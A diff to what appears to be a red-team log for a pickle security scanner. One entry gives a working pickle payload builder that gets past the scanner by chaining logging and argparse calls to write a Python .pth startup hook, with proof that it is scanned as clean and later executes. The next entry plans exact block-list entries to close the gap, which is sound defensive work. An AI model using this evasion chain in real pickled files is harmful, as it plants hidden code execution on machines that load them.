@@ -6895,3 +6895,187 @@ Blocking plan:
 Performance note: one exact entry in the existing sorted policy table and no
 Python source parsing, constructor blocking, or broad `_xxsubinterpreters`
 wildcard block.
+
+## Turn 123 - Logging stream handler high-level dispatch `.pth` write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using clean high-level logging
+APIs plus a callable stdlib file opener to write an attacker-controlled
+startup hook.
+
+Candidate payload:
+
+- Construct `argparse.FileType("w")`.
+- Call the returned `FileType` object directly through pickle `REDUCE` with an
+  attacker-selected `.pth` path. This avoids a `FileType.__call__` global name,
+  so no magic-method string is present.
+- Construct `logging.StreamHandler(file_obj)`.
+- Call `logging.getLogger()`, then
+  `logging.Logger.setLevel(root_logger, 0)`.
+- Call `logging.Logger.addHandler(root_logger, handler)`.
+- Build a `.pth` startup-hook line with `builtins.str.join` from harmless
+  fragments: `"im"`, `"port pathlib;pathlib.Path("`, `repr(marker_path)`,
+  and `").write_text('owned-by-logging-stream')\n"`.
+- Call `logging.Logger.warning(root_logger, message)`.
+- Normal Python site processing later executes the line from the `.pth` file.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+def tuple_for(values: list[bytes]) -> bytes:
+    if not values:
+        return b")"
+    if len(values) == 1:
+        return values[0] + b"\x85"
+    if len(values) == 2:
+        return values[0] + values[1] + b"\x86"
+    if len(values) == 3:
+        return values[0] + values[1] + values[2] + b"\x87"
+    return b"(" + b"".join(values) + b"t"
+
+
+pth_path = Path("/tmp/ma_logging_stream_exec.pth")
+marker = Path("/tmp/ma_logging_stream_marker")
+fragments = [
+    "im",
+    "port pathlib;pathlib.Path(",
+    repr(str(marker)),
+    ").write_text('owned-by-logging-stream')\n",
+]
+
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("argparse", "FileType"),
+        text("w"),
+        b"\x85R\x94",
+        b"h\x00",
+        text(str(pth_path)),
+        b"\x85R\x94",
+        sg("logging", "StreamHandler"),
+        b"h\x01\x85R\x94",
+        sg("logging", "getLogger"),
+        b")R\x94",
+        sg("logging", "Logger.setLevel"),
+        b"h\x03K\x00\x86R0",
+        sg("logging", "Logger.addHandler"),
+        b"h\x03h\x02\x86R0",
+        sg("builtins", "str.join"),
+        text(""),
+        tuple_for([text(fragment) for fragment in fragments]),
+        b"\x86R\x94",
+        sg("logging", "Logger.warning"),
+        b"h\x03h\x04\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Constructor/control scanner result: `len=434`, `status=complete`,
+  `verdict=clean`, `is_clean=True`, `findings=[]`, `notices=[]`,
+  `errors=[]`
+- Constructor/control coverage: `bytes_scanned=434`, `bytes_total=434`,
+  `opcode_count=57`, `raw_scan_complete=True`,
+  `opcode_scan_complete=True`
+- Constructor/control import references: `argparse.FileType`,
+  `logging.StreamHandler`, `logging.getLogger`, `logging.Logger.setLevel`,
+  `logging.Logger.addHandler`, and `builtins.str.join`, all with
+  `is_dangerous=False`
+- Constructor/control string heuristic matches: `[]`
+- Constructor/control runtime: `pickle.loads(control)` creates an empty
+  `.pth` file and returns the root logger; `site.addsitedir(target_dir)` does
+  not create the marker.
+- RCE scanner result: `len=464`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`, `errors=[]`
+- RCE coverage: `bytes_scanned=464`, `bytes_total=464`, `opcode_count=63`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- RCE import references: `argparse.FileType`, `logging.StreamHandler`,
+  `logging.getLogger`, `logging.Logger.setLevel`,
+  `logging.Logger.addHandler`, `builtins.str.join`, and
+  `logging.Logger.warning`, all with `is_dangerous=False`
+- RCE string heuristic matches: `[]`
+- Before unpickle: no `.pth` file and no marker exists.
+- After `pickle.loads(payload)`: the `.pth` file exists and contains
+  `import pathlib;pathlib.Path('/tmp/.../marker').write_text('owned-by-logging-stream')`;
+  the marker does not exist yet.
+- After normal `site.addsitedir(target_dir)`: the marker exists and contains
+  `owned-by-logging-stream`.
+
+RCE mechanism:
+
+- `argparse.FileType("w")` is a clean callable file opener for an
+  attacker-selected path. Calling the returned object through pickle `REDUCE`
+  avoids any suspicious `__call__` literal.
+- `logging.StreamHandler` can wrap that attacker-selected file object without
+  using blocked `logging.FileHandler` or `logging.handlers.*` constructors.
+- `logging.Logger.addHandler` attaches the stream handler to the root logger,
+  and `logging.Logger.warning` reaches the blocked-in-spirit emit path without
+  the pickle referencing `logging.Handler.handle` or
+  `logging.StreamHandler.emit`.
+- `builtins.str.join` assembles the executable `.pth` line only at runtime, so
+  no individual pickle string contains an import statement.
+
+Why the scanner missed it:
+
+- `argparse` is not a wildcard-dangerous module, and `argparse.FileType` is
+  absent from `DANGEROUS_GLOBALS`.
+- `logging.StreamHandler`, `logging.getLogger`, `logging.Logger.setLevel`,
+  `logging.Logger.addHandler`, and `logging.Logger.warning` are absent from
+  `DANGEROUS_GLOBALS`.
+- Existing logging blocks cover direct file handlers and low-level emit/handle
+  dispatch, but not this high-level handler-registration and severity-method
+  route.
+- The payload has complete opcode coverage, no scan errors, no findings, no
+  notices, and no suspicious-string matches.
+
+Performance note: the focused next block should use exact dangerous-global
+entries rather than logging simulation. The narrowest reliable set for this
+chain is `argparse.FileType`, `logging.StreamHandler`,
+`logging.Logger.addHandler`, and high-level logging emission methods such as
+`logging.Logger.warning` plus the module-level severity wrappers if covered in
+regression variants. Exact entries keep lookup cost in the sorted policy table
+and avoid modeling logger state, stream provenance, or `.pth` paths.
+
+## Turn 124 - Block logging stream handler high-level dispatch
+
+Blocking plan:
+
+- Add exact dangerous-global entries for the callable file opener
+  `argparse.FileType`, the stream wrapper `logging.StreamHandler`, and
+  `logging.Logger.addHandler`.
+- Add exact dangerous-global entries for high-level logger emission and
+  dispatch methods: `Logger.debug`, `Logger.info`, `Logger.warning`,
+  `Logger.warn`, `Logger.error`, `Logger.exception`, `Logger.critical`,
+  `Logger.log`, `Logger._log`, `Logger.handle`, and
+  `Logger.callHandlers`.
+- Add exact dangerous-global entries for the module-level severity wrappers:
+  `logging.debug`, `logging.info`, `logging.warning`, `logging.warn`,
+  `logging.error`, `logging.exception`, `logging.critical`, and
+  `logging.log`.
+- Add a CPython oracle regression for the Turn 123 chain with both
+  `logging.Logger.warning` and module-level `logging.warning`. The setup-only
+  control is malicious because it creates an attacker-selected `.pth` and
+  registers a handler, but it stays operationally limited: the `.pth` is empty
+  and normal `site.addsitedir()` does not create the marker. The active
+  payloads remain RCE-capable and write a fragmented startup hook that
+  `site.addsitedir()` executes.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: exact entries only. The block avoids logger-state
+simulation, stream provenance tracking, message formatting analysis, and
+path/content modeling for `.pth` files.
